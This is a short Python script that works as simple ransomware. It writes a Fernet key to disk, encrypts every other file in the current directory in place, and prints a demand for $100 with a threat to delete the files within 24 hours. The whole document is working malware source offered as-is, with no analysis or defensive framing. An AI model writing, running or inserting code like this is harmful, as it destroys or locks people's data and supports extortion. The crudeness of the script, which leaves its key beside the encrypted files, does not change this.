from cryptography.fernet import Fernet
import os


key = Fernet.generate_key()
with open("encryptedKey.key", "wb") as encryptedKey:
    encryptedKey.write(key)


files = []

# Get all the list of files in the current directory
for path in os.listdir():
    # Ignore the main.py and encrypted.key file
    if (path == "main.py" or path == "encryptedKey.key"):
        continue
    # Check the cureent path type is file or not
    # if the path type is file then append to files list
    if os.path.isfile(path):
        files.append(path)

# Iterate the loop over the files list
for file in files:
    # Read and encrypt the file data
    with open(file, "rb") as file1:
        rawData = file1.read()
    encryptedRawData = Fernet(key).encrypt(rawData)
    # Update the same file with encrypted data
    with open(file, "wb") as file2:
        file2.write(encryptedRawData)

# Notify the message to the user
print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
